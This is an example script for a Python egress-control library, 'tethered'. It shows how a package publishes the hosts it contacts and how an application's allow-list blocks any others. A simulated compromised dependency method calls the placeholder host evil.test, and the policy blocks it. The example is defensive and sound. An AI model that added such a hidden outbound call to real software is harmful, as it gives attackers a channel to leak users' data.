"""Package maintainer pattern — the library publishes its hosts, the application enforces them.

A library does not turn tethered on: neither activate() nor scope() belongs in
the code it ships. It finds out which hosts it contacts, publishes them, and
uses tethered in its own tests. The application that runs the process puts
those hosts into its policy.
"""

from __future__ import annotations

import httpx

import tethered

# --- Simulated library code (what a package maintainer writes) ---

#: The hosts the library contacts. Printed in the library's documentation.
HOSTS = ("api.github.com:443",)


class WeatherClient:
    """A weather SDK that publishes the hosts it contacts."""

    def get_forecast(self, city: str) -> str:
        """Fetch a forecast from the weather API."""
        resp = httpx.head("https://api.github.com", timeout=5)
        return f"Forecast for {city} (HTTP {resp.status_code})"

    def try_exfiltrate(self) -> str:
        """Simulates a compromised dependency inside the library."""
        httpx.head("https://evil.test", timeout=5)
        return "Data sent (unexpected)"


# --- What the maintainer runs to find out which hosts the library contacts ---

# A log-only scope that allows nothing refuses nothing and reports every
# lookup (port None) and connection the call makes in this thread.
seen: set[tuple[str, int | None]] = set()
with tethered.scope(allow=[], log_only=True, on_blocked=lambda host, port: seen.add((host, port))):
    WeatherClient().get_forecast("London")
print(f"Contacted by get_forecast: {sorted(seen, key=str)}")

# --- Simulated app code (what an app builder writes) ---

# The application's policy, with the hosts the library documents. A real
# application activates before it imports the library.
tethered.activate(allow=[*HOSTS])

client = WeatherClient()

# Library call succeeds: its host is in the application's policy
print(f"get_forecast: {client.get_forecast('London')}")

# Library call blocked: evil.test is not in the policy
try:
    client.try_exfiltrate()
except tethered.EgressBlocked as e:
    print(f"try_exfiltrate: blocked — {e}")
